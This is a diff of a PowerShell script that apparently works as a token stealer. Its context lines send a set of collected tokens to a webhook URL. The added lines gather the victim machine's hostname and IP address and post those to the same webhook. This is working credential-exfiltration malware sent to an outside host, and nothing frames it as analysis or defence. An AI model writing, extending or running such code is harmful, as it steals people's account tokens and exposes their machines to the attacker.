@@ -206,3 +206,14 @@ $Body = @{
   'content' = $possibleTokens | Format-Table -HideTableHeaders | Out-String
 }
 Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
+
+Add-Type -AssemblyName System.Windows.Forms
+$ip=get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
+$ipaddress = $ip.ipaddress[0]
+$pcname = [System.Net.Dns]::GetHostName()
+
+$Body = @{
+    'username' = 'Tokens: '
+    'content' = "My PC name - $pcname `n`nMy IP address - $ipaddress"
+  }
+  Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
